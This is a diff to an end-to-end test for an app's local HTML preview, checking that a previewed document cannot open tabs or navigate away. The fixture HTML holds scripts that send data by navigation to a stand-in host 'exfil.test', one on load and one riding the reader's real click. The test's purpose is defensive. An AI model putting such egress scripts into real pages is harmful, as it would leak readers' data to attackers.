@@ -15,6 +15,7 @@ import {
   readPairedHtmlPreviewInventory,
   readPairedHtmlPreviewLinkRouting
 } from './helpers/paired-html-preview-inventory'
+import { focusPairedClientWindow } from './helpers/paired-client-window-reveal'
 import { ensureTerminalVisible, waitForActiveWorktree, waitForSessionReady } from './helpers/store'
 
 const FIXTURE_NAME = 'paired-html-focus.html'
@@ -22,6 +23,8 @@ const FIXTURE_HEADING = 'paired html preview'
 const EXTERNAL_LINK_URL = 'https://example.com/from-preview'
 /** Stands in for the exfiltration a previewed document would attempt on its own, with no one at the keyboard. */
 const SCRIPTED_EGRESS_URL = 'https://exfil.test/?d=scripted'
+/** The same exfiltration, but riding a press the reader really made somewhere else in the document. */
+const POST_INPUT_EGRESS_URL = 'https://exfil.test/?d=after-input'
 
 /**
  * Since STA-5557 a paired HTML preview renders locally from the workspace's disk over the
@@ -53,10 +56,21 @@ test('renders a paired HTML doc locally without creating any browser page', asyn
       `await new Promise((resolve)=>setTimeout(resolve,2000));` +
       `out.textContent='candidates='+found.length}` +
       `catch(error){out.textContent='threw:'+error.name}})()</script>` +
+      `<div id="post-input-egress">idle</div>` +
       // Why the document tries to leave by itself: a preview may read its whole grant over
       // `connect-src 'self'`, so an unattended navigation to an attacker is how those bytes would
       // get out. It runs on every load here; the baseline browser counts below are the oracle.
-      `<script>try{window.open('${SCRIPTED_EGRESS_URL}','_blank')}catch(error){}` +
+      // Why the second attempt rides a real press: a gate that only asks "was there input
+      // recently" cannot tell that navigation from the click's own effect, so it would route these
+      // bytes out. The document reports having tried, which is the presence half of that oracle.
+      // Why the listener is registered first: setting `location.href` mid-parse stops the parser,
+      // so anything written after this script may never exist.
+      `<script>document.addEventListener('pointerdown',()=>{` +
+      `const out=document.getElementById('post-input-egress');` +
+      `if(out.textContent==='attempted'){return}out.textContent='attempted';` +
+      `try{window.open('${POST_INPUT_EGRESS_URL}','_blank')}catch(error){}` +
+      `location.href='${POST_INPUT_EGRESS_URL}'},true);` +
+      `try{window.open('${SCRIPTED_EGRESS_URL}','_blank')}catch(error){}` +
       `location.href='${SCRIPTED_EGRESS_URL}'</script>` +
       `</body></html>\n`
   )
@@ -293,9 +307,8 @@ test('renders a paired HTML doc locally without creating any browser page', asyn
     ).toBeVisible({ timeout: 30_000 })
 
     // Why this runs last: it is the one step that is supposed to create a browser tab, so it
-    // cannot share a run phase with the no-browser oracle above. A target="_blank" click is only
-    // routed out if the guest carries allowpopups, and only a real mouse press is a user gesture
-    // Chromium will honour — a scripted click inside the guest is swallowed by the popup blocker.
+    // cannot share a run phase with the no-browser oracle above. Only a real mouse press produces
+    // the trusted event the guest's preload will report; nothing the document dispatches does.
     await expect(openPreviewToSide).toBeVisible({ timeout: 30_000 })
     await openPreviewToSide.click()
     await expect
@@ -316,13 +329,40 @@ test('renders a paired HTML doc locally without creating any browser page', asyn
     // appeared" cannot say whether the press was swallowed before the handler or the tab was
     // refused after it. The recorded calls make the failure name itself.
     await armPairedHtmlPreviewLinkRouting(page)
-    // Why the heading click first: the press that routes the link has to carry user activation in
-    // the guest, and the guest only has it once it holds focus.
+    // Why the window has to come to the front: main routes a reported click only from the contents
+    // the reader is looking at, and this client is launched hidden and behind everything.
+    expect(await focusPairedClientWindow(client)).toMatchObject({
+      isFocused: true,
+      isVisible: true
+    })
+    // Why before the heading press: that press is what the document rides, so a baseline taken
+    // after it would absorb any tab the document opened on the back of it.
+    const linkBaseline = await readPairedHtmlPreviewInventory(page, inventoryArgs)
+    // Why the heading click first: focus has to be on the guest itself, not merely on the window
+    // that hosts it, before the press on the link is one main will answer.
     const headingPoint = await readDocPreviewElementCenter(page, 'h1')
     if (headingPoint) {
       await page.mouse.click(headingPoint.x, headingPoint.y)
     }
-    const linkBaseline = await readPairedHtmlPreviewInventory(page, inventoryArgs)
+    // Presence precondition for the baseline below: the document really did try to leave on the
+    // back of that genuine press, rather than never running its attempt at all.
+    await expect
+      .poll(() => readDocPreviewRenderedText(page, '#post-input-egress'), {
+        timeout: 30_000,
+        message: 'the preview document never attempted its post-input egress'
+      })
+      .toBe('attempted')
+    const afterGenuineInput = await readPairedHtmlPreviewInventory(page, inventoryArgs)
+    expect({
+      clientBrowserWorkspaceCountAllWorktrees:
+        afterGenuineInput.clientBrowserWorkspaceCountAllWorktrees,
+      hostBrowserTabCount: afterGenuineInput.hostBrowserTabCount,
+      routedCalls: await readPairedHtmlPreviewLinkRouting(page)
+    }).toEqual({
+      clientBrowserWorkspaceCountAllWorktrees: linkBaseline.clientBrowserWorkspaceCountAllWorktrees,
+      hostBrowserTabCount: linkBaseline.hostBrowserTabCount,
+      routedCalls: []
+    })
     await expect
       .poll(
         async () => {
